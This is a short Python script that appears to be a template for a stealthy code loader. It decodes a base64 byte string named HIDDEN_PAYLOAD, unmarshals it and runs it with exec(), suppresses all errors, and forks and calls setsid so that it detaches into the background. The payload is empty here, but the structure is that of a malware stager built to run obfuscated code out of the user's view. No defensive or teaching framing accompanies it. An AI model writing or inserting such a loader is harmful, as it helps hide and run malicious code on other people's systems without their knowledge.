import os, sys, time, platform, marshal, base64

HIDDEN_PAYLOAD = b''

def run():
    try:
        dec = base64.b64decode(HIDDEN_PAYLOAD)
        code_obj = marshal.loads(dec)
        exec(code_obj)
    except Exception:
        pass

if __name__ == "__main__":
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
        os.setsid()
    except:
        pass
    run()
